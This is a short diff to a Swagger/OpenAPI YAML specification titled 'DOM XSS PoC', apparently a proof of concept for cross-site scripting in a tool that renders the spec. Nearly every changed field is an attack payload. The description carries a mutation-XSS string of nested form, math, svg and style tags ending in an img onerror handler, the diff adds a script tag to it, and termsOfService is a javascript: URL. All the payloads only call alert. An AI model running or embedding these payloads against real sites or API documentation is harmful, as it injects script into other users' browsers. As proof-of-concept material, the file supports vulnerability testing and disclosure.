@@ -6,7 +6,7 @@ securityDefinitions:
 info:
   version: "0.0.1"
   title: 'DOM XSS PoC<img src=x>'
-  description: '<form><math><mtext></form><form><mglyph><svg><mtext><style><path id="</style><img onerror=alert(document.domain) src>">'
+  description: '<form><math><mtext></form><form><script>alert(0)</script><mglyph><svg><mtext><style><path id="</style><img onerror=alert(document.domain) src>">'
   termsOfService: "javascript:alert(document.domain)"
 paths:
   /:
